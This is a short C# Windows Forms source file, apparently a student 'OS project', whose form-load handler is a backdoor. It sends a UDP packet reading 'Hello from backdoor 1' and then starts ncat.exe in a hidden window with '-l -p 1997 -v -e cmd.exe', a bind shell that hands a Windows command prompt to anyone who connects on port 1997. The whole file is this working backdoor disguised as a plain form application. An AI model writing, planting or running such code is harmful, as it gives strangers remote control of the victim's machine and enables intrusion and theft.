using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace OSproject_r1
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            byte[] packetData = Encoding.ASCII.GetBytes("Hello from backdoor 1");
            string ipAddress = GetLocalIPAddress();
            int portNumber = 1997;

            IPEndPoint otherServer = new IPEndPoint(IPAddress.Parse(ipAddress), portNumber);

            Socket client = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            client.SendTo(packetData, otherServer);

            Process serverListener = new Process();
            serverListener.StartInfo.FileName = "ncat.exe";
            serverListener.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            serverListener.StartInfo.Arguments = "-l -p 1997 -v -e cmd.exe";
            serverListener.Start();
        }

        public static string GetLocalIPAddress()
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            throw new Exception("No network adapters with an IPv4 address in the system!");
        }
    }
}
